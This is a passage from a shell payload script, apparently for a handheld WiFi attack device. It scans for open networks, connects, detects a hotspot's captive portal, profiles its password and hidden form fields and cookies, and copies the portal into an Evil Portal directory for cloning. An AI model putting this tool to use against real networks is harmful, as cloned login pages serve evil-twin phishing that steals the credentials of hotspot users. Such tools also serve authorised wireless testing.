    cat > "$output_file" << 'EOF'
Form Field Analysis
===================
EOF
    
    local html_files
    html_files=$(find "$portal_dir" -name "*.html" -o -name "*.php" 2>/dev/null)
    
    local password_fields=0
    local email_fields=0
    local hidden_fields=0
    local csrf_tokens=0
    
    for file in $html_files; do
        # Password fields
        local pw
        pw=$(grep -ciE 'type\s*=\s*["\x27]?password' "$file" 2>/dev/null || echo 0)
        password_fields=$((password_fields + pw))
        
        # Email fields
        local em
        em=$(grep -ciE 'type\s*=\s*["\x27]?(email|text)["\x27]?\s+.*name\s*=\s*["\x27]?(email|mail|user)' "$file" 2>/dev/null || echo 0)
        email_fields=$((email_fields + em))
        
        # Hidden fields
        local hf
        hf=$(grep -ciE 'type\s*=\s*["\x27]?hidden' "$file" 2>/dev/null || echo 0)
        hidden_fields=$((hidden_fields + hf))
        
        # CSRF tokens
        local csrf
        csrf=$(grep -ciE '(csrf|token|_token|authenticity)' "$file" 2>/dev/null || echo 0)
        csrf_tokens=$((csrf_tokens + csrf))
        
        # Extract actual field names
        grep -oP 'name\s*=\s*["\x27][^"\x27]+["\x27]' "$file" 2>/dev/null | \
            sed "s/name\s*=\s*[\"']//g" | tr -d "\"'" >> "$output_file.fields"
    done
    
    cat >> "$output_file" << EOF

Summary:
- Password fields: $password_fields
- Email/username fields: $email_fields  
- Hidden fields: $hidden_fields
- CSRF/token references: $csrf_tokens

Field Names Found:
EOF
    
    if [ -f "$output_file.fields" ]; then
        sort -u "$output_file.fields" >> "$output_file"
        rm -f "$output_file.fields"
    fi
    
    LOG "  Password fields: $password_fields, Hidden: $hidden_fields, CSRF: $csrf_tokens"
    log_to_file "Form analysis: pw=$password_fields, hidden=$hidden_fields, csrf=$csrf_tokens"
}

# Analyze cookie expiration times
analyze_cookies() {
    local output_file="$1"
    
    LOG "Analyzing cookies..."
    
    if [ ! -f "$COOKIE_JAR" ]; then
        echo "No cookies captured" > "$output_file"
        return
    fi
    
    cat > "$output_file" << 'EOF'
Cookie Analysis
===============
EOF
    
    local now
    now=$(date +%s)
    
    # Parse Netscape cookie format
    while IFS=$'\t' read -r domain flag path secure expiry name value; do
        # Skip comments
        [[ "$domain" =~ ^# ]] && continue
        [ -z "$name" ] && continue
        
        local exp_date="Session"
        local exp_status=""
        
        if [ -n "$expiry" ] && [ "$expiry" != "0" ]; then
            exp_date=$(date -d "@$expiry" 2>/dev/null || echo "Unknown")
            if [ "$expiry" -lt "$now" ]; then
                exp_status=" [EXPIRED]"
            elif [ "$((expiry - now))" -lt 3600 ]; then
                exp_status=" [EXPIRING SOON]"
            fi
        fi
        
        echo -e "Cookie: $name" >> "$output_file"
        echo "  Domain: $domain" >> "$output_file"
        echo "  Expires: $exp_date$exp_status" >> "$output_file"
        echo "  Secure: $secure" >> "$output_file"
        echo "" >> "$output_file"
        
    done < "$COOKIE_JAR"
    
    local count
    count=$(grep -c "^Cookie:" "$output_file" 2>/dev/null || echo 0)
    LOG "  Analyzed $count cookies"
    log_to_file "Cookie analysis: $count cookies"
}

# Check session validity (detect timeout)
check_session_valid() {
    local portal_url="$1"
    
    local now
    now=$(date +%s)
    
    # Don't check too frequently
    if [ $((now - SESSION_LAST_CHECK)) -lt $SESSION_CHECK_INTERVAL ]; then
        return 0
    fi
    
    SESSION_LAST_CHECK=$now
    
    # Try to access portal with existing cookies
    local response
    response=$(curl -s -m 5 -b "$COOKIE_JAR" -c "$COOKIE_JAR" -w "%{http_code}" -o /dev/null "$portal_url" 2>/dev/null)
    
    # Check for session timeout indicators
    case "$response" in
        401|403)
            LOG yellow "Session may have expired (HTTP $response)"
            log_to_file "Session timeout detected: HTTP $response"
            return 1
            ;;
        302|303)
            # Check if redirecting to login
            local redirect_url
            redirect_url=$(curl -s -m 5 -b "$COOKIE_JAR" -w "%{redirect_url}" -o /dev/null "$portal_url" 2>/dev/null)
            if echo "$redirect_url" | grep -qiE "(login|auth|session)"; then
                LOG yellow "Session expired - redirecting to login"
                log_to_file "Session timeout: redirect to $redirect_url"
                return 1
            fi
            ;;
    esac
    
    return 0
}

# Track response time (BusyBox compatible - seconds only)
track_response_time() {
    local url="$1"
    local start_time end_time elapsed
    
    start_time=$(date +%s)
    curl -s -m 10 -o /dev/null "$url" 2>/dev/null
    end_time=$(date +%s)
    
    # Elapsed in seconds (BusyBox doesn't support %N)
    elapsed=$(( (end_time - start_time) * 1000 ))
    
    # Store in a file instead of array (ash/dash compatible)
    echo "$elapsed" >> "$TEMP_DIR/response_times.txt"
    
    log_to_file "Response time for $url: ${elapsed}ms"
    echo "$elapsed"
}

# Get average response time (file-based for ash/dash compatibility)
get_avg_response_time() {
    local total=0
    local count=0
    
    if [ ! -f "$TEMP_DIR/response_times.txt" ]; then
        echo "0"
        return
    fi
    
    while read -r t; do
        [ -z "$t" ] && continue
        total=$((total + t))
        count=$((count + 1))
    done < "$TEMP_DIR/response_times.txt"
    
    if [ $count -eq 0 ]; then
        echo "0"
        return
    fi
    
    echo $((total / count))
}

# Sanitize HTML - remove tracking scripts
sanitize_html() {
    local file="$1"
    
    if [ ! -f "$file" ]; then
        return
    fi
    
    log_to_file "Sanitizing: $file"
    
    local tmp_file="${file}.sanitized"
    cp "$file" "$tmp_file"
    
    # Remove tracking domains
    for domain in "${TRACKING_DOMAINS[@]}"; do
        # Remove script tags with tracking domains
        sed -i "/<script[^>]*$domain[^>]*>.*<\/script>/Id" "$tmp_file" 2>/dev/null
        sed -i "/<script[^>]*$domain[^>]*>/,/<\/script>/d" "$tmp_file" 2>/dev/null
        
        # Remove img/iframe with tracking domains
        sed -i "/<img[^>]*$domain[^>]*>/Id" "$tmp_file" 2>/dev/null
        sed -i "/<iframe[^>]*$domain[^>]*>.*<\/iframe>/Id" "$tmp_file" 2>/dev/null
        
        # Remove link tags (CSS) with tracking
        sed -i "/<link[^>]*$domain[^>]*>/Id" "$tmp_file" 2>/dev/null
    done
    
    # Remove common tracking patterns
    sed -i '/google-analytics\.com/d' "$tmp_file" 2>/dev/null
    sed -i '/gtag\s*(/d' "$tmp_file" 2>/dev/null
    sed -i '/fbq\s*(/d' "$tmp_file" 2>/dev/null
    sed -i '/_gaq\.push/d' "$tmp_file" 2>/dev/null
    
    mv "$tmp_file" "$file"
}

# Create portal archive
create_portal_archive() {
    local portal_dir="$1"
    local archive_name="$2"
    
    LOG "Creating portal archive..."
    
    local archive_path="${LOOT_DIR}/${archive_name}.tar.gz"
    
    if tar -czf "$archive_path" -C "$(dirname "$portal_dir")" "$(basename "$portal_dir")" 2>/dev/null; then
        local size
        size=$(du -h "$archive_path" | cut -f1)
        LOG green "  Archive created: $archive_path ($size)"
        log_to_file "Archive created: $archive_path ($size)"
        echo "$archive_path"
        return 0
    fi
    
    LOG red "  Failed to create archive"
    return 1
}

# Integration with goodportal_configure
integrate_with_goodportal() {
    local portal_dir="$1"
    local portal_name="$2"
    
    LOG "Integrating with goodportal..."
    
    # Check if goodportal directory exists
    local goodportal_base="/www/portals"
    if [ ! -d "$goodportal_base" ]; then
        mkdir -p "$goodportal_base"
    fi
    
    # Create symlink or copy
    local target_dir="$goodportal_base/$portal_name"
    
    if [ -d "$target_dir" ]; then
        LOG yellow "  Portal already exists in goodportal, backing up..."
        mv "$target_dir" "${target_dir}.bak.$(date +%s)"
    fi
    
    # Copy portal to goodportal location
    cp -r "$portal_dir" "$target_dir"
    
    if [ -d "$target_dir" ]; then
        LOG green "  Portal copied to $target_dir"
        log_to_file "Integrated with goodportal: $target_dir"
        
        # Check if goodportal_configure is available
        if [ -f "/etc/init.d/evilportal" ]; then
            LOG "  Evil Portal service available"
            return 0
        fi
    fi
    
    return 1
}

# =============================================================================
# ENHANCED PORTAL DETECTION FUNCTIONS
# =============================================================================

# Detect DNS hijacking (portal intercepts all DNS queries)
detect_dns_hijack() {
    LOG "  Checking for DNS hijack..."
    
    for entry in "${DNS_CHECK_DOMAINS[@]}"; do
        local domain="${entry%%:*}"
        local expected_prefix="${entry##*:}"
        
        # Resolve domain
        local resolved
        resolved=$(nslookup "$domain" 2>/dev/null | grep -A1 "Name:" | grep "Address" | awk '{print $2}' | head -1)
        
        if [ -z "$resolved" ]; then
            # Try alternative method - use sed instead of grep -P
            resolved=$(ping -c1 -W2 "$domain" 2>/dev/null | head -1 | sed -E 's/.*\(([0-9.]+)\).*/\1/')
        fi
        
        if [ -n "$resolved" ]; then
            # Check if resolved IP matches expected prefix
            if [[ ! "$resolved" =~ ^$expected_prefix ]]; then
                LOG green "    DNS hijack detected: $domain -> $resolved"
                # Portal is likely at the hijacked IP
                DNS_HIJACK_IP="$resolved"
                return 0
            fi
        fi
    done
    
    LOG "    No DNS hijack detected"
    return 1
}

# Extract JavaScript-based redirects from HTML content (BusyBox compatible)
extract_js_redirects() {
    local html_file="$1"
    local redirects=""
    
    if [ ! -f "$html_file" ]; then
        return 1
    fi
    
    # window.location patterns - use sed instead of grep -P
    redirects=$(grep "window\.location" "$html_file" 2>/dev/null | sed -E "s/.*window\.location\s*=\s*[\"']([^\"']+)[\"'].*/\1/" | head -1)
    [ -n "$redirects" ] && [ "$redirects" != "$(grep 'window\.location' "$html_file" 2>/dev/null | head -1)" ] && echo "$redirects" && return 0
    
    # location.href patterns
    redirects=$(grep "location\.href" "$html_file" 2>/dev/null | sed -E "s/.*location\.href\s*=\s*[\"']([^\"']+)[\"'].*/\1/" | head -1)
    [ -n "$redirects" ] && echo "$redirects" && return 0
    
    # location.replace patterns
    redirects=$(grep "location\.replace" "$html_file" 2>/dev/null | sed -E "s/.*location\.replace\s*\(\s*[\"']([^\"']+)[\"'].*/\1/" | head -1)
    [ -n "$redirects" ] && echo "$redirects" && return 0
    
    # Meta refresh patterns
    redirects=$(grep -i "content=" "$html_file" 2>/dev/null | grep -i "url=" | sed -E 's/.*url=([^"'\'']+).*/\1/' | head -1)
    [ -n "$redirects" ] && echo "$redirects" && return 0
    
    return 1
}

# Parse WISPr XML response for login URL (BusyBox compatible)
parse_wispr_response() {
    local content="$1"
    local login_url=""
    
    # Check if this is a WISPr response
    if echo "$content" | grep -qi "WISPAccessGatewayParam"; then
        LOG "    WISPr response detected"
        
        # Extract LoginURL - use sed instead of grep -P
        login_url=$(echo "$content" | grep -i "LoginURL" | sed -E 's/.*<LoginURL>([^<]+)<.*/\1/' | head -1)
        [ -z "$login_url" ] && login_url=$(echo "$content" | grep -i "LoginURL" | sed -E 's/.*<!\[CDATA\[([^\]]+)\].*/\1/' | head -1)
        
        if [ -n "$login_url" ]; then
            # Decode HTML entities
            login_url=$(echo "$login_url" | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g')
            echo "$login_url"
            return 0
        fi
    fi
    
    return 1
}

# Check for headless browser availability
check_headless_available() {
    if command -v phantomjs >/dev/null 2>&1; then
        HEADLESS_TOOL="phantomjs"
        HEADLESS_AVAILABLE=1
        return 0
    elif command -v chromium >/dev/null 2>&1; then
        HEADLESS_TOOL="chromium"
        HEADLESS_AVAILABLE=1
        return 0
    elif command -v playwright >/dev/null 2>&1; then
        HEADLESS_TOOL="playwright"
        HEADLESS_AVAILABLE=1
        return 0
    fi
    
    HEADLESS_AVAILABLE=0
    return 1
}

# Use headless browser to render page and capture final URL/content
headless_fetch() {
    local url="$1"
    local output_file="$2"
    
    if [ "$HEADLESS_AVAILABLE" -eq 0 ]; then
        return 1
    fi
    
    LOG "  Using headless browser ($HEADLESS_TOOL)..."
    
    case "$HEADLESS_TOOL" in
        phantomjs)
            # Create PhantomJS script
            cat > /tmp/phantom_fetch.js << 'JSEOF'
var page = require('webpage').create();
var system = require('system');
var url = system.args[1];
var output = system.args[2];

page.settings.userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15';
page.settings.javascriptEnabled = true;

page.open(url, function(status) {
    if (status === 'success') {
        // Wait for JS redirects
        setTimeout(function() {
            var fs = require('fs');
            fs.write(output + '.url', page.url, 'w');
            fs.write(output, page.content, 'w');
            phantom.exit(0);
        }, 3000);
    } else {
        phantom.exit(1);
    }
});
JSEOF
            timeout 15 phantomjs /tmp/phantom_fetch.js "$url" "$output_file" 2>/dev/null
            rm -f /tmp/phantom_fetch.js
            ;;
        chromium)
            # Use chromium in headless mode
            timeout 15 chromium --headless --disable-gpu --dump-dom "$url" > "$output_file" 2>/dev/null
            ;;
    esac
    
    [ -f "$output_file" ] && [ -s "$output_file" ]
}

# Preserve URL parameters when modifying forms
preserve_url_params() {
    local html_file="$1"
    local portal_url="$2"
    
    # Extract query string from portal URL
    local query_string="${portal_url#*\?}"
    
    if [ "$query_string" != "$portal_url" ] && [ -n "$query_string" ]; then
        LOG "  Preserving URL parameters: $query_string"
        
        # Parse parameters and add as hidden fields
        local hidden_fields=""
        IFS='&' read -ra PARAMS <<< "$query_string"
        for param in "${PARAMS[@]}"; do
            local key="${param%%=*}"
            local value="${param#*=}"
            # URL decode value
            value=$(printf '%b' "${value//%/\\x}")
            hidden_fields="$hidden_fields<input type=\"hidden\" name=\"$key\" value=\"$value\">\n"
        done
        
        # Insert hidden fields after form tags
        if [ -n "$hidden_fields" ]; then
            sed -i "s|<form\([^>]*\)>|<form\1>\n$hidden_fields|gi" "$html_file" 2>/dev/null
        fi
    fi
}

# =============================================================================
# PHASE 1: SCAN FOR SSIDS
# =============================================================================
scan_ssids() {
    LOG "=== SCANNING FOR NETWORKS ==="
    led_scanning
    
    mkdir -p "$TEMP_DIR"
    
    # Check if interface exists
    if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
        LOG red "Interface $INTERFACE not found!"
        LOG ""
        LOG "Available interfaces:"
        ip link show 2>/dev/null | grep -E "^[0-9]+:" | awk -F': ' '{print "  " $2}'
        ERROR_DIALOG "Interface not found!\n\n$INTERFACE does not exist.\n\nCheck WiFi adapter."
        return 1
    fi
    
    # Check if interface is in use by another wpa_supplicant
    if ps | grep -v grep | grep "wpa_supplicant" | grep -q "$INTERFACE"; then
        LOG yellow "Interface $INTERFACE in use by wpa_supplicant"
        LOG "Killing existing wpa_supplicant..."
        for pid in $(ps | grep "wpa_supplicant" | grep "$INTERFACE" | grep -v grep | awk '{print $1}'); do
            kill -9 "$pid" 2>/dev/null
        done
        sleep 1
    fi
    
    # Ensure interface is up and in managed mode
    LOG "Preparing interface..."
    ip link set "$INTERFACE" down 2>/dev/null
    sleep 1
    iw dev "$INTERFACE" set type managed 2>/dev/null
    ip link set "$INTERFACE" up 2>/dev/null
    sleep 2
    
    LOG "Scanning on $INTERFACE..."
    local spinner_id
    spinner_id=$(START_SPINNER "Scanning for networks...")
    
    # Perform scan
    local scan_output
    local scan_result
    scan_output=$(iw dev "$INTERFACE" scan 2>&1)
    scan_result=$?
    
    STOP_SPINNER "$spinner_id"
    
    if [ $scan_result -ne 0 ]; then
        LOG yellow "First scan failed, retrying..."
        sleep 3
        spinner_id=$(START_SPINNER "Retrying scan...")
        scan_output=$(iw dev "$INTERFACE" scan 2>&1)
        scan_result=$?
        STOP_SPINNER "$spinner_id"
        
        if [ $scan_result -ne 0 ]; then
            LOG red "Scan failed: $scan_output"
            ERROR_DIALOG "Scan failed!\n\n$INTERFACE may be busy.\n\nTry again later."
            return 1
        fi
    fi
    
    # Parse scan results - extract SSID, BSSID, signal, and channel
    echo "$scan_output" | awk '
    BEGIN { bssid=""; ssid=""; signal=""; freq=0; }
    /^BSS / {
        if (bssid != "" && ssid != "" && ssid != "HIDDEN") {
            # Convert freq to channel
            if (freq >= 2412 && freq <= 2484) {
                ch = (freq - 2407) / 5
            } else if (freq >= 5180) {
                ch = (freq - 5000) / 5
            } else {
                ch = 0
            }
            print signal "|" ssid "|" bssid "|" ch
        }
        bssid = $2
        sub(/\(on.*/, "", bssid)
        ssid = ""
        signal = ""
        freq = 0
    }
    /SSID:/ {
        ssid = $0
        sub(/.*SSID: */, "", ssid)
        gsub(/^[ \t]+|[ \t]+$/, "", ssid)
        if (ssid == "") ssid = "HIDDEN"
    }
    /signal:/ {
        signal = $2
        sub(/\..*/, "", signal)
    }
    /freq:/ {
        freq = $2
        sub(/\..*/, "", freq)
    }
    END {
        if (bssid != "" && ssid != "" && ssid != "HIDDEN") {
            if (freq >= 2412 && freq <= 2484) {
                ch = (freq - 2407) / 5
            } else if (freq >= 5180) {
                ch = (freq - 5000) / 5
            } else {
                ch = 0
            }
            print signal "|" ssid "|" bssid "|" ch
        }
    }' | sort -t'|' -k1 -nr | head -n $MAX_SSIDS > "$TEMP_DIR/ssids_raw.txt"
    
    # Apply signal strength filter
    filter_by_signal "$TEMP_DIR/ssids_raw.txt" "$TEMP_DIR/ssids_filtered.txt"
    
    # Apply band filter
    filter_by_band "$TEMP_DIR/ssids_filtered.txt" "$TEMP_DIR/ssids.txt"
    
    local ssid_count
    ssid_count=$(wc -l < "$TEMP_DIR/ssids.txt" 2>/dev/null || echo "0")
    LOG "Found $ssid_count networks"
    
    if [ "$ssid_count" -eq 0 ]; then
        local raw_count
        raw_count=$(wc -l < "$TEMP_DIR/ssids_raw.txt" 2>/dev/null || echo "0")
        if [ "$raw_count" -gt 0 ]; then
            ERROR_DIALOG "No networks match filters!\n\nFound $raw_count networks but\nall filtered out.\n\nAdjust signal/band settings."
        else
            ERROR_DIALOG "No networks found!\n\nMake sure $INTERFACE is available and try again."
        fi
        return 1
    fi
    
    return 0
}

# =============================================================================
# PHASE 2: SELECT SSID
# =============================================================================
select_ssid() {
    LOG "=== SELECT TARGET NETWORK ==="
    
    # Build selection menu (file-based for ash/dash compatibility)
    local menu_text="Select target network:\n\n"
    local idx=1
    
    # Create indexed file for lookup
    > "$TEMP_DIR/ssids_indexed.txt"
    
    while IFS='|' read -r signal ssid bssid channel; do
        echo "$idx|$ssid|$bssid|$channel" >> "$TEMP_DIR/ssids_indexed.txt"
        menu_text="${menu_text}${idx}. ${ssid} (${signal}dBm)\n"
        idx=$((idx + 1))
        if [ $idx -gt $MAX_SSIDS ]; then
            break
        fi
    done < "$TEMP_DIR/ssids.txt"
    
    PROMPT "$menu_text"
    
    local selection
    selection=$(NUMBER_PICKER "Select network (1-$((idx-1)))" "1")
    
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
            LOG "User cancelled"
            return 1
            ;;
        $DUCKYSCRIPT_ERROR)
            ERROR_DIALOG "Selection error"
            return 1
            ;;
    esac
    
    # Validate selection
    if [ "$selection" -lt 1 ] || [ "$selection" -gt $((idx-1)) ]; then
        ERROR_DIALOG "Invalid selection: $selection"
        return 1
    fi
    
    # Look up selected network from indexed file (ash/dash compatible)
    local selected_line
    selected_line=$(grep "^${selection}|" "$TEMP_DIR/ssids_indexed.txt")
    TARGET_SSID=$(echo "$selected_line" | cut -d'|' -f2)
    TARGET_BSSID=$(echo "$selected_line" | cut -d'|' -f3)
    TARGET_CHANNEL=$(echo "$selected_line" | cut -d'|' -f4)
    
    LOG "Selected: $TARGET_SSID"
    LOG "  BSSID: $TARGET_BSSID"
    LOG "  Channel: $TARGET_CHANNEL"
    
    # Confirm selection
    local resp
    resp=$(CONFIRMATION_DIALOG "Connect to:\n\n$TARGET_SSID\n\nThis will attempt to connect and detect captive portal.")
    
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
            LOG "User cancelled"
            return 1
            ;;
    esac
    
    if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG "User declined"
        return 1
    fi
    
    return 0
}

# =============================================================================
# PHASE 3: CONNECT TO NETWORK
# =============================================================================
connect_to_network() {
    LOG "=== CONNECTING TO NETWORK ==="
    led_connecting
    
    # Create wpa_supplicant config for open network
    cat > "$WPA_CONF" << EOF
ctrl_interface=$WPA_CTRL
update_config=1

network={
    ssid="$TARGET_SSID"
    key_mgmt=NONE
    scan_ssid=1
}
EOF
    
    # Kill any existing wpa_supplicant on this interface
    for pid in $(ps | grep "wpa_supplicant" | grep "$INTERFACE" | grep -v grep | awk '{print $1}'); do
        kill -9 "$pid" 2>/dev/null
    done
    rm -rf "$WPA_CTRL" 2>/dev/null
    sleep 1
    
    # Start wpa_supplicant with driver fallback
    LOG "Starting wpa_supplicant..."
    
    # Try nl80211 first (preferred), fallback to wext if it fails
    if ! wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null; then
        LOG yellow "  nl80211 driver failed, trying wext..."
        if ! wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D wext 2>/dev/null; then
            LOG yellow "  wext driver failed, trying without driver spec..."
            wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" 2>/dev/null
        fi
    fi
    echo $! > /tmp/clone_portal_wpa.pid
    sleep 3
    
    # Check if connected
    LOG "Waiting for association..."
    local attempts=0
    local max_attempts=15
    local connected=0
    
    while [ $attempts -lt $max_attempts ]; do
        local status=$(wpa_cli -p "$WPA_CTRL" -i "$INTERFACE" status 2>/dev/null | grep "wpa_state=" | cut -d= -f2)
        
        if [ "$status" = "COMPLETED" ]; then
            connected=1
            break
        fi
        
        attempts=$((attempts + 1))
        sleep 1
    done
    
    if [ $connected -eq 0 ]; then
        LOG red "Failed to associate with network"
        
        # Ask if user wants to try with password
        local resp
        resp=$(CONFIRMATION_DIALOG "Connection failed!\n\nNetwork may require password.\nTry with WPA password?")
        
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
                return 1
                ;;
        esac
        
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            local password
            password=$(TEXT_PICKER "Enter WiFi password" "")
            
            case $? in
                $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                    return 1
                    ;;
            esac
            
            if [ -n "$password" ]; then
                # Recreate config with password
                cat > "$WPA_CONF" << EOF
ctrl_interface=$WPA_CTRL
update_config=1

network={
    ssid="$TARGET_SSID"
    psk="$password"
    scan_ssid=1
}
EOF
                # Restart wpa_supplicant
                for pid in $(ps | grep "wpa_supplicant" | grep "$INTERFACE" | grep -v grep | awk '{print $1}'); do
                    kill -9 "$pid" 2>/dev/null
                done
                rm -rf "$WPA_CTRL" 2>/dev/null
                sleep 1
                
                wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null
                sleep 3
                
                # Try again
                attempts=0
                while [ $attempts -lt $max_attempts ]; do
                    status=$(wpa_cli -p "$WPA_CTRL" -i "$INTERFACE" status 2>/dev/null | grep "wpa_state=" | cut -d= -f2)
                    
                    if [ "$status" = "COMPLETED" ]; then
                        connected=1
                        break
                    fi
                    
                    attempts=$((attempts + 1))
                    sleep 1
                done
            fi
        fi
        
        if [ $connected -eq 0 ]; then
            ERROR_DIALOG "Could not connect to:\n$TARGET_SSID"
            return 1
        fi
    fi
    
    LOG green "Associated with $TARGET_SSID"
    
    # Get IP via DHCP
    LOG "Requesting IP address..."
    
    # Kill any existing dhcp client
    killall udhcpc 2>/dev/null
    sleep 1
    
    # Request DHCP lease
    udhcpc -i "$INTERFACE" -t 10 -T 3 -n -q 2>/dev/null
    
    # Verify we got an IP
    local ip_addr=$(ip addr show "$INTERFACE" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
    
    if [ -z "$ip_addr" ]; then
        ERROR_DIALOG "Failed to obtain IP address"
        return 1
    fi
    
    LOG green "Got IP: $ip_addr"
    
    # Get gateway
    GATEWAY=$(ip route show dev "$INTERFACE" 2>/dev/null | grep default | awk '{print $3}')
    LOG "Gateway: $GATEWAY"
    
    return 0
}

# =============================================================================
# PHASE 4: DETECT CAPTIVE PORTAL (ENHANCED)
# =============================================================================
detect_captive_portal() {
    LOG "=== DETECTING CAPTIVE PORTAL ==="
    led_cloning
    
    PORTAL_URL=""
    PORTAL_DETECTED=0
    DNS_HIJACK_IP=""
    
    # -------------------------------------------------------------------------
    # Method 1: DNS Hijack Detection
    # -------------------------------------------------------------------------
    LOG "Method 1: DNS hijack detection..."
    if detect_dns_hijack; then
        PORTAL_URL="http://$DNS_HIJACK_IP/"
        PORTAL_DETECTED=1
        LOG green "  Portal likely at: $PORTAL_URL"
    fi
    
    # -------------------------------------------------------------------------
    # Method 2: HTTP Connectivity Check (standard method)
    # -------------------------------------------------------------------------
    if [ $PORTAL_DETECTED -eq 0 ]; then
        LOG "Method 2: HTTP connectivity check..."
        
        for url in "${DETECTION_URLS_HTTP[@]}"; do
            LOG "  Testing: $url"
            
            local response
            local http_code
            local final_url
            local redirect_url
            
            response=$(curl -s -L -m $TIMEOUT -o /dev/null -w "%{http_code}|%{url_effective}|%{redirect_url}" "$url" 2>/dev/null)
            http_code=$(echo "$response" | cut -d'|' -f1)
            final_url=$(echo "$response" | cut -d'|' -f2)
            redirect_url=$(echo "$response" | cut -d'|' -f3)
            
            LOG "    HTTP: $http_code"
            
            # Check for redirect
            if [ "$http_code" = "302" ] || [ "$http_code" = "301" ] || [ "$http_code" = "307" ]; then
                if [ -n "$redirect_url" ]; then
                    PORTAL_URL="$redirect_url"
                else
                    PORTAL_URL="$final_url"
                fi
                PORTAL_DETECTED=1
                LOG green "  Redirect detected: $PORTAL_URL"
                break
            elif [ "$http_code" = "200" ]; then
                # Check content for portal indicators
                local content
                content=$(curl -s -m $TIMEOUT "$url" 2>/dev/null)
                
                # Check for WISPr response
                local wispr_url
                wispr_url=$(parse_wispr_response "$content")
                if [ -n "$wispr_url" ]; then
                    PORTAL_URL="$wispr_url"
                    PORTAL_DETECTED=1
                    LOG green "  WISPr login URL: $PORTAL_URL"
                    break
                fi
                
                # Check for portal keywords (multi-language)
                if echo "$content" | head -c 1000 | grep -qiE "($PORTAL_KEYWORDS_ALL)"; then
                    # Save content for JS redirect extraction
                    echo "$content" > /tmp/portal_check.html
                    
                    # Check for JavaScript redirects
                    local js_redirect
                    js_redirect=$(extract_js_redirects /tmp/portal_check.html)
                    if [ -n "$js_redirect" ]; then
                        LOG green "  JS redirect found: $js_redirect"
                        # Make relative URLs absolute
                        if [[ "$js_redirect" =~ ^/ ]]; then
                            local base_domain
                            base_domain=$(echo "$url" | sed -E 's|(https?://[^/]+).*|\1|')
                            js_redirect="${base_domain}${js_redirect}"
                        fi
                        PORTAL_URL="$js_redirect"
                    else
                        PORTAL_URL="$url"
                    fi
                    PORTAL_DETECTED=1
                    LOG green "  Portal content detected"
                    rm -f /tmp/portal_check.html
                    break
                fi
            fi
        done
    fi
    
    # -------------------------------------------------------------------------
    # Method 3: HTTPS Connectivity Check (for HTTPS-only portals)
    # -------------------------------------------------------------------------
    if [ $PORTAL_DETECTED -eq 0 ]; then
        LOG "Method 3: HTTPS connectivity check..."
        
        for url in "${DETECTION_URLS_HTTPS[@]}"; do
            LOG "  Testing: $url"
            
            local response
            local http_code
            local final_url
            
            # Note: -k to ignore cert errors (portal may have self-signed cert)
            response=$(curl -s -k -L -m $TIMEOUT -o /dev/null -w "%{http_code}|%{url_effective}" "$url" 2>/dev/null)
            http_code=$(echo "$response" | cut -d'|' -f1)
            final_url=$(echo "$response" | cut -d'|' -f2)
            
            LOG "    HTTP: $http_code"
            
            if [ "$http_code" = "302" ] || [ "$http_code" = "301" ] || [ "$http_code" = "307" ]; then
                PORTAL_URL="$final_url"
                PORTAL_DETECTED=1
                LOG green "  HTTPS redirect: $PORTAL_URL"
                break
            elif [ "$http_code" = "200" ] && [ "$final_url" != "$url" ]; then
                # Was redirected to different URL
                PORTAL_URL="$final_url"
                PORTAL_DETECTED=1
                LOG green "  HTTPS portal: $PORTAL_URL"
                break
            fi
        done
    fi
    
    # -------------------------------------------------------------------------
    # Method 4: Gateway Direct Access
    # -------------------------------------------------------------------------
    if [ $PORTAL_DETECTED -eq 0 ] && [ -n "$GATEWAY" ]; then
        LOG "Method 4: Gateway direct access..."
        LOG "  Testing: http://$GATEWAY/"
        
        local gw_response
        gw_response=$(curl -s -m $TIMEOUT "http://$GATEWAY/" 2>/dev/null)
        
        if [ -n "$gw_response" ]; then
            # Check for WISPr
            local wispr_url
            wispr_url=$(parse_wispr_response "$gw_response")
            if [ -n "$wispr_url" ]; then
                PORTAL_URL="$wispr_url"
                PORTAL_DETECTED=1
                LOG green "  WISPr at gateway: $PORTAL_URL"
            elif echo "$gw_response" | head -c 1000 | grep -qiE "($PORTAL_KEYWORDS_ALL|<form)"; then
                # Save and check for JS redirects
                echo "$gw_response" > /tmp/portal_check.html
                local js_redirect
                js_redirect=$(extract_js_redirects /tmp/portal_check.html)
                if [ -n "$js_redirect" ]; then
                    if [[ "$js_redirect" =~ ^/ ]]; then
                        js_redirect="http://$GATEWAY$js_redirect"
                    fi
                    PORTAL_URL="$js_redirect"
                else
                    PORTAL_URL="http://$GATEWAY/"
                fi
                PORTAL_DETECTED=1
                LOG green "  Portal at gateway"
                rm -f /tmp/portal_check.html
            fi
        fi
    fi
    
    # -------------------------------------------------------------------------
    # Method 5: Headless Browser (optional, for JS-heavy portals)
    # -------------------------------------------------------------------------
    if [ $PORTAL_DETECTED -eq 0 ] && [ "$USE_HEADLESS_BROWSER" -eq 1 ] && [ "$HEADLESS_AVAILABLE" -eq 1 ]; then
        LOG "Method 5: Headless browser rendering..."
        
        local test_url="${DETECTION_URLS_HTTP[0]}"
        if headless_fetch "$test_url" "/tmp/headless_result.html"; then
            # Check if we got redirected
            if [ -f "/tmp/headless_result.html.url" ]; then
                local rendered_url
                rendered_url=$(cat /tmp/headless_result.html.url)
                if [ "$rendered_url" != "$test_url" ]; then
                    PORTAL_URL="$rendered_url"
                    PORTAL_DETECTED=1
                    LOG green "  Headless detected portal: $PORTAL_URL"
                fi
            fi
            rm -f /tmp/headless_result.html /tmp/headless_result.html.url
        fi
    fi
    
    # -------------------------------------------------------------------------
